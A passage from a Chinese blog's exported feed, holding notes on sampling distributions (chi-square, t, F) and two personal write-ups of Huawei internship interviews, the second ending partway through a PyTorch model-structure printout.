class="headerlink" title="2.1.1.4 样本k阶原点矩&#xD;"></a>2.1.1.4 样本k阶原点矩&#xD;</h4><p>$$<br>A_{k}&#x3D;\frac{1}{n} \sum_{i&#x3D;1}^{n} X_{i}^{k} \quad k&#x3D;1,2, \ldots<br>$$</p><h4 id="2-1-1-5-样本k阶中心矩"><a href="#2-1-1-5-样本k阶中心矩" class="headerlink" title="2.1.1.5 样本k阶中心矩"></a>2.1.1.5 样本k阶中心矩</h4><p>$$<br>B_k&#x3D;\frac1n\sum_{i&#x3D;1}^n\left(X_i-\overline{X}\right)^k<br>$$</p><h3 id="2-1-2-统计量的观察值"><a href="#2-1-2-统计量的观察值" class="headerlink" title="2.1.2 统计量的观察值"></a>2.1.2 统计量的观察值</h3><p><img src="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/image_W7032fmBdo.png"></p><p><strong>定理</strong>：若总体X的k阶矩$E\left(X^{k}\right)&#x3D;\mu_{k}$存在，则当$n \rightarrow \infty$时，$A_{k} \xrightarrow{P} \mu_{k}(k&#x3D;1,2, \cdots)$</p><p><strong>结论</strong>：设$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$是来自总体X的一个样本，则$E(X)&#x3D;\mu$，即：</p><p>$$<br>E\left(A_{1}\right)&#x3D;E\left(\frac{1}{n} \sum_{i&#x3D;1}^{n} X_{i}\right)&#x3D;E(X)&#x3D;\mu<br>$$</p><h2 id="2-2-统计三大抽样分布"><a href="#2-2-统计三大抽样分布" class="headerlink" title="2.2 统计三大抽样分布"></a>2.2 统计三大抽样分布</h2><p>统计量的分布称为抽样分布，来自正态总体的三个常用统计量的分布：$\chi^{2}$（卡方）分布、t分布和F分布。</p><h3 id="2-2-1-chi-2"><a href="#2-2-1-chi-2" class="headerlink" title="$2.2.1 \chi^{2}"></a>$2.2.1 \chi^{2}</h3><p>$分布</p><p>定义：设$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$相互独立，都服从正态分布N(0, 1)，则称随机变量</p><p>$$<br>\chi^{2}&#x3D;X_{1}^{2}+X_{2}^{2}+\cdots+X_{n}^{2}<br>$$</p><p>服从自由度为n的$\chi^{2}$分布，记为$\chi^{2} \sim \chi^{2}(n)$。</p><p>$\chi^{2}(n)$分布的概率密度为：</p><p><img src="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/image_1ngs-dTz5z.png"></p><p>$\chi^{2}(n)$分布的概率密度图像为：</p><p><img src="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/image_RvoGULDRhe.png"></p><p><img src="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/image_GkEuFzXQ4s.png"></p><h4 id="2-2-1-1-chi-2-分布的分位点"><a href="#2-2-1-1-chi-2-分布的分位点" class="headerlink" title="$2.2.1.1 \chi^{2}$分布的分位点"></a>$2.2.1.1 \chi^{2}$分布的分位点</h4><p>对于给定的正数α，0&lt;α&lt;1，称满足以下条件的点$\chi_{\alpha}^{2}(n)$为$\chi^{2}(n)$分布的上α分位点。</p><p>$$<br>P{\chi^{2}&gt;\chi_{\alpha}^{2}(n)}&#x3D;\int_{\chi_{\alpha}^{2}(n)}^{\infty} f(y) \mathrm{d} y&#x3D;\alpha<br>$$</p><p>当n充分大时，$\chi_{\alpha}^{2}(n) \approx \frac{1}{2}\left(z_{\alpha}+\sqrt{2 n-1}\right)^{2}$，其中$\boldsymbol{z}_{\alpha}$是正态分布的上α分位点。</p><p><img src="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/image_nh6B6optkm.png"></p><h3 id="2-2-2-t-分布-xD"><a href="#2-2-2-t-分布-xD" class="headerlink" title="2.2.2 t 分布&#xD;"></a>2.2.2 t 分布&#xD;</h3><p>设$X \sim N(0,1), Y \sim \chi^{2}(n)$，且X，Y独立，则随机变量$t&#x3D;\frac{X}{\sqrt{Y &#x2F; n}}$服从自由度为n的t分布，记为$t \sim t(n)$，t分布又称学生氏分布。</p><p>t(n)分布的概率密度函数为：</p><p>$$<br>h(t)&#x3D;\frac{\Gamma\left(\frac{n+1}{2}\right)}{\sqrt{\pi n} \Gamma\left(\frac{n}{2}\right)}\left(1+\frac{t^{2}}{n}\right)^{-\frac{n+1}{2}}-\infty&lt;t&lt;+\infty<br>$$</p><h4 id="2-2-2-1-t分布的性质"><a href="#2-2-2-1-t分布的性质" class="headerlink" title="2.2.2.1 t分布的性质"></a>2.2.2.1 t分布的性质</h4><p>（1）具有自由度为n的t分布t~t(n)，其数学期望与方差为：$E(t)&#x3D;0, D(t)&#x3D;n &#x2F;(n-2)$</p><p>（2）t分布的概率密度函数关于t&#x3D;0对称，即当n足够大时，满足$t \stackrel{\text { 近似 }}{\sim} N(0,1)$，即$\lim _{n \rightarrow \infty} h(t)&#x3D;\frac{1}{\sqrt{2 \pi}} e^{\frac{-t^{2}}{2}}$</p><p>t(n) 分布的概率密度曲线如下图所示：</p><p><img src="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/image_6-0KoPERzo.png"></p><p>（3）t分布的分位点：对于给定的α，0&lt;α&lt;1，称满足条件$P{t&gt;t_{\alpha}(n)}&#x3D;\int_{t_{\alpha}(n)}^{\infty} h(t) d t&#x3D;\alpha$的点称为t(n)分布的上α分位点，如图所示：</p><p><img src="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/image_1RPVlPOTJg.png"></p><p>t分布的上α分位点的性质：$t_{1-\alpha}(n)&#x3D;-t_{\alpha}(n)$；当n&gt;45时，$t_{\alpha}(n) \approx z_{\alpha}$。</p><h3 id="2-2-3-F分布"><a href="#2-2-3-F分布" class="headerlink" title="2.2.3 F分布"></a>2.2.3 F分布</h3><p><img src="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/image_ALRZqFUp0W.png"></p><p>$F\left(n_{1}, n_{2}\right)$分布的概率密度为：</p><p>$$<br>\psi(y)&#x3D;\begin{cases}&amp;\frac{\Gamma\left(\frac{n_1+n_2}{2}\right)\left(\frac{n_1}{n_2}\right)^{\frac{n_1}{2}}y^{\frac{n_1}{2}-1}}{\Gamma\left(\frac{n_1}{2}\right)\Gamma\left(\frac{n_2}{2}\right)\left[1+\left(\frac{n_1y}{n_2}\right)\right]^{\frac{n_1+n_2}{2}}},&amp;y&gt;0,\&amp;0,&amp;\text{其他}.\end{cases}<br>$$</p><p>F分布的概率密度曲线如图</p><p><img src="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/image_fqxJP-MvOX.png"></p><h4 id="2-2-3-1-F分布的性质"><a href="#2-2-3-1-F分布的性质" class="headerlink" title="2.2.3.1 F分布的性质"></a>2.2.3.1 F分布的性质</h4><p>（1）如果$ \mathbf{F}\sim\mathbf{F}\left(\mathbf{n}_1,\mathbf{n}_2\right) $，那么$\frac{1}{\mathbf{F}} \sim F (\mathbf{n}_2,\mathbf{n}_1)$</p><p>（2）F分布的数学期望为：</p><p>$$<br>\mathbf{E}(\mathbf{F})&#x3D;\frac{\mathbf{n}_2}{n_2-2}\quad\text{若}n_2&gt;2<br>$$</p><p>（3）F分布的分位数：对于给定的α，0&lt;α&lt;1，称满足条件</p><p>$$<br>P{F&gt;F_{\alpha}(n_{1}, n_{2})}&#x3D;\int_{F_{\alpha}(n_{1}, n_{2})}^{\infty} \phi(y) d y&#x3D;\alpha<br>$$</p><p>的点$F_{\alpha}\left(n_{1}, n_{2}\right)$为$F\left(n_{1}, n_{2}\right)$分布的上α分位点，如图所示：</p><p><img src="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/image_7Ng2Ol-jT9.png"></p><p>F分布的上α分位点的性质：$F_{1-\alpha}\left(n_{1}, n_{2}\right)&#x3D;\frac{1}{F_{\alpha}\left(n_{2}, n_{1}\right)}$</p><p>F分布的上α分位数可查表求得，如下所示：</p><p>$$<br>F_{0.95}(12,9)&#x3D;\frac{1}{F_{0.05}(9,12)}&#x3D;\frac{1}{2.80}&#x3D;0.357<br>$$</p><h2 id="2-3-正态总体的样本均值和样本方差的分布"><a href="#2-3-正态总体的样本均值和样本方差的分布" class="headerlink" title="2.3 正态总体的样本均值和样本方差的分布"></a>2.3 正态总体的样本均值和样本方差的分布</h2><p>设总体X（不管服从什么分布，只要均值和方差存在）的均值为$\mu$，方差为$\sigma^{2}$，$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$是来自X的一个样本，X，S²分别是样本均值和样本方差，则有：</p><p>$$<br>E(\bar{X})&#x3D;\mu, D(\bar{X})&#x3D;\sigma^{2} &#x2F; n, \quad E\left(S^{2}\right)&#x3D;\sigma^{2}<br>$$</p><h3 id="2-3-1-定理1"><a href="#2-3-1-定理1" class="headerlink" title="2.3.1 定理1"></a>2.3.1 定理1</h3><ul><li>定理1是关于样本均值的分布</li></ul><p>设$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$是来自正态总体$N\left(\mu, \sigma^{2}\right)$的样本，$\overline{X}$是样本均值，则有：</p><p>$$<br>X \sim N\left(\mu, \frac{\sigma^{2}}{n}\right) \quad 即 \frac{\bar{X}-\mu}{\sigma &#x2F; \sqrt{n}} \sim N(0,1)<br>$$</p><h3 id="2-3-2-定理2"><a href="#2-3-2-定理2" class="headerlink" title="2.3.2 定理2"></a>2.3.2 定理2</h3><ul><li>定理2是关于样本方差的分布</li></ul><p>设$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$是来自正态总体$N\left(\mu, \sigma^{2}\right)$的样本，$\overline{X}$是样本均值，S²是样本方差，则有：</p><ol><li>$\frac{(n-1) S^{2}}{\sigma^{2}} \sim \chi^{2}(n-1)$</li><li>$\overline{X}$与S²独立</li></ol><p>该定理主要适用于<strong>总体均值</strong>$\mu$<strong>未知</strong>的情况。</p><h3 id="2-3-3-定理3"><a href="#2-3-3-定理3" class="headerlink" title="2.3.3 定理3"></a>2.3.3 定理3</h3><p>设$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$是来自正态总体$N\left(\mu, \sigma^{2}\right)$的样本，$\overline{X}$是样本均值，S²是样本方差，则有：</p><p>$$<br>\frac{\bar{X}-\mu}{S &#x2F; \sqrt{n}} \sim t(n-1)<br>$$</p><p>主要适用于<strong>总体方差</strong>$\sigma^{2}$<strong>未知</strong>的情况。</p><h3 id="2-3-4-定理4"><a href="#2-3-4-定理4" class="headerlink" title="2.3.4 定理4"></a>2.3.4 定理4</h3><ul><li>该定理是关于两总体样本均值差、样本方差比的分布</li></ul><p>设$X \sim N\left(\mu_{1}, \sigma_{1}^{2}\right)$，$Y \sim N\left(\mu_{2}, \sigma_{2}^{2}\right)$，且X与Y独立，$X_{1}, X_{2}, \ldots, X_{\mathrm{n1}}$是来自X的样本，$Y_{1}, Y_{2}, \ldots, Y_{\mathrm{n2}}$是来自Y的样本，$\overline{X}$和$\overline{Y}$分别是这两个样本的样本均值，$S_{1}^{2}$和$S_{2}^{2}$分别是这两个样本的样本方差，则有：</p><p>$$<br>\frac{(\bar{X}-\bar{Y})-(\mu_1-\mu_2)}{S_w\sqrt{\frac{1}{n_1}+\frac{1}{n_2}}}\sim t (n_1+n_2-2)<br>$$</p><p>当$\sigma_{1}^{2}&#x3D;\sigma_{2}^{2}&#x3D;\sigma^{2}$时，有</p><p>$$<br>\frac{(\bar{X}-\bar{Y})-\left(\mu_{1}-\mu_{2}\right)}{S_{w} \sqrt{\frac{1}{n_{1}}+\frac{1}{n_{2}}}} \sim t\left(n_{1}+n_{2}-2\right),<br>$$</p><p>$$<br>其中 S_{w}^{2}&#x3D;\frac{\left(n_{1}-1\right) S_{1}^{2}+\left(n_{2}-1\right) S_{2}^{2}}{n_{1}+n_{2}-2}, \quad S_{w}&#x3D;\sqrt{S_{w}^{2}}.<br>$$</p><hr><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h1><p>本章主要介绍了以下内容：</p><ol><li>总体和样本的概念</li><li>统计量和分布函数的定义</li><li>统计3大抽样分布：卡方分布、t分布和F分布</li><li>4个重要的抽样分布定理</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试记录2：华为业务主管二面</title>
      <link href="/2024/06/13/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%952%EF%BC%9A%E5%8D%8E%E4%B8%BA%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AE%A1%E4%BA%8C%E9%9D%A2/"/>
      <url>/2024/06/13/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%952%EF%BC%9A%E5%8D%8E%E4%B8%BA%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AE%A1%E4%BA%8C%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="1-面试背景"><a href="#1-面试背景" class="headerlink" title="1 面试背景"></a>1 面试背景</h1><ul><li>面试公司：华为技术有限公司</li><li>面试岗位：推荐搜索</li><li>面试类型：业务主管二面</li><li>面试时间：2024-06-13 14:15~14:50</li><li>面试结果：通过 😊</li></ul><hr><h1 id="2-整体感受"><a href="#2-整体感受" class="headerlink" title="2 整体感受"></a>2 整体感受</h1><p>面试官没有开摄像头，不知道面试官的表情，感觉有点不得劲哈哈。</p><p><img src="/2024/06/13/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%952%EF%BC%9A%E5%8D%8E%E4%B8%BA%E4%B8%9A%E5%8A%A1%E4%B8%BB%E7%AE%A1%E4%BA%8C%E9%9D%A2/image_zrlpFcI-Bi.png"></p><p>整体来说感觉还行，这次面试没有问很多技术上的问题，更多是对你价值观一些的问题，还有会深挖一些简历上的东西，所以应该对简历上的内容非常熟悉。</p><p>而且，面试官真的很好，我面试中说到了我早上8点之前就到实验室，然后除了吃饭之外，基本上都在实验室，晚上10点才离开，然后面试官就开始鼓励我，他说“你的这个习惯真的很好，一定要坚持下去，因为等你到中年发现，你一生中的很多成就都是在你青年的时候获得的，所以在你青年的时候一定要多做一些事情，这样你才有所收获”。</p><p>面试结束了，之后也没有其他的面试了，就只有等待结果了，希望自己可以通过，真的很想去华为实习，这个经历真的很 nice。</p><p>自己做的不错的地方：</p><ol><li>面试官问什么就答什么，可以适当拓展，但是不要说太多了，要不然面试官可能都不想听下去</li><li>回答的逻辑也比较好，有条理，可以让面试官抓到重点</li><li>感觉自己的面试经验经过这几次面试已经提升了很多了</li></ol><hr><h1 id="3-提问的问题"><a href="#3-提问的问题" class="headerlink" title="3 提问的问题"></a>3 提问的问题</h1><blockquote><p>问：你能介绍一下论文中的创新点吗？</p></blockquote><p>答：blblbl，感觉面试官不太懂这个，但是只要你讲出自信，他就没啥问题要问你了</p><blockquote><p>问：你能说一下你这个实验是怎么做的吗？</p></blockquote><p>答：我是在学校机房开了20~30台机器做的，每组算法之间对战了1000局游戏</p><blockquote><p>问：最后的效果怎么样？</p></blockquote><p>答：最后的效果对比MCTS的胜率是55%，然后对比传统的博弈搜索算法AlphaBeta和Minimax的效果会好很多，然后我分析了一下为什么效果只有略微的提升。</p><ol><li>由于实验部分是在海克斯棋游戏上进行，棋盘大小是19×19，状态空间较大，所以搜索得到的结点之间的联系较弱，不能形成非常有效的关系。</li><li>另外，实验的计算资源也有限，没有搜索很长时间，所以搜索的结点数也较小，如果搜索时间越长，效果就会越好。</li></ol><blockquote><p>问：你平时了解咨询的主要途径有哪些？</p></blockquote><p>答：主要是通过github，它有一个流行仓库的功能，所以我会经常看一些这种仓库，除此之外，会经常看一些IT人写的技术博客，另外也会看一些类似华为公司的产品发布会或者技术文档。</p><blockquote><p>问：你刚才说你主要通过github看一些东西，那能举一个例子吗？</p></blockquote><p>答：我最近在github上学习了上海人工智能实验室的书生·浦语大模型，它有一个技术文档，并且会分配给你免费的算力，你可以部署它的一些模型。另外，它还有茴香豆，就是在群聊中的一个AI小助手，它会识别群友的问题是否是有效的问题，如果是有效的，那么它就会进行回答，否则它就当作没看见。</p><blockquote><p>问：你想通过这次实习得到什么，或者说你对这次实习的期待是什么？</p></blockquote><p>答：我最想通过这次实习提升自己的能力，总感觉自己在学校中学习到的和在工业界真正能应用的还是有差距的，因此我想通过这次实习提升自己这方面的能力。此外，我经常在学校中，我知道学校中的东西和在社会上的东西其实是有很大差距的，所以这也是我期待的地方。</p><blockquote><p>问：你能说一下对华为的认识，价值观之类的吗？</p></blockquote><p>答：我认为华为是一个很有野心的公司，blblblb………</p><blockquote><p>问：你未来的职业规划是什么？</p></blockquote><p>答：我的成绩比较优异，所以能拿到学校的推免资格，明年毕业后应该继续读研，研究方向应该也是深度学习方向。</p>]]></content>
      
      
      <categories>
          
          <category> 找工作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试记录1：华为技术一面</title>
      <link href="/2024/06/13/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%951%EF%BC%9A%E5%8D%8E%E4%B8%BA%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/"/>
      <url>/2024/06/13/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%951%EF%BC%9A%E5%8D%8E%E4%B8%BA%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="1-面试背景"><a href="#1-面试背景" class="headerlink" title="1 面试背景"></a>1 面试背景</h1><ul><li>面试公司：华为技术有限公司</li><li>面试岗位：推荐搜索</li><li>面试类型：技术一面</li><li>面试时间：2024-06-13 9:00~10:00</li><li>面试结果：通过 😊</li></ul><hr><h1 id="2-整体感受"><a href="#2-整体感受" class="headerlink" title="2 整体感受"></a>2 整体感受</h1><p>感觉面试官一进来就很面善哈哈哈哈，整体感觉面试过程很让人舒服，面试官说话的语气也很好。</p><p>面完整体感觉还是挺不错的，希望能通过这一轮面试。</p><p><img src="/2024/06/13/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%951%EF%BC%9A%E5%8D%8E%E4%B8%BA%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image.png"></p><p>需要加强的地方：</p><ol><li>需要了解一下 C++ 和 Python 语言的特性，面试真的会被问到</li><li>基础知识还是挺重要的，系统能力应该注意</li></ol><hr><h1 id="3-提问的问题"><a href="#3-提问的问题" class="headerlink" title="3 提问的问题"></a>3 提问的问题</h1><p>首先让你进行自我介绍，感觉现在自己自我介绍一点都不紧张，很放松，达到了自己想要的效果。</p><h2 id="3-1-针对简历"><a href="#3-1-针对简历" class="headerlink" title="3.1 针对简历"></a>3.1 针对简历</h2><blockquote><p>问：你当过就业市场部副部长，还举办过第一届双选会？</p></blockquote><p>答：是的，（说完之后面试官笑了笑，哈哈哈哈，感觉挺逗的，当时我应该再回复几句就更好了哈哈哈，面试官人真好）</p><blockquote><p>问：你简历中参加了博弈大赛，获得了两个项目的一等奖，能具体说一下队伍分工吗？</p></blockquote><p>答：我们队伍一共3个人，我作为队长主要负责整体进度规划和核心代码撰写，另一个人主要负责神经网络的训练，最后一个人主要负责棋力水平的测试。</p><blockquote><p>问：你说你们训练使用了分布式训练，能具体说一下吗？</p></blockquote><p>答：我们学校的机房中机器大部分都是没有GPU的机器，只有CPU，所以我们使用机房中的20~30台机器收集数据，并将收集好的数据给实验室中的一台3060ti的服务器进行训练</p><blockquote><p>问：你们这个3060ti服务器上有几张卡？</p></blockquote><p>答：只有一张卡</p><blockquote><p>问：只有一张卡（面试官此时有些惊讶），那你们训练了多少时间啊？网络的参数大概有多少？</p></blockquote><p>答：训练了3个星期左右，网络参数的话没太关注，因为我们使用的是AlphaGo的网络结构，没有进行改进。</p><h3 id="3-1-1-网络的参数规模"><a href="#3-1-1-网络的参数规模" class="headerlink" title="3.1.1 网络的参数规模"></a>3.1.1 网络的参数规模</h3><ul><li><code>Number of parameter: 3.08M</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">total = <span class="built_in">sum</span>([param.nelement() <span class="keyword">for</span> param <span class="keyword">in</span> <span class="variable language_">self</span>.trainer.net_work.parameters()])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Number of parameter: %.2fM&quot;</span> % (total/<span class="number">1e6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------</span></span><br><span class="line">NetWork(</span><br><span class="line">  (first_net): RestNet8B96C(</span><br><span class="line">    (conv): Conv2d(<span class="number">1</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">    (bn): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">    (relu): ReLU()</span><br><span class="line">    (residues): Sequential(</span><br><span class="line">      (<span class="number">0</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">1</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">2</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span 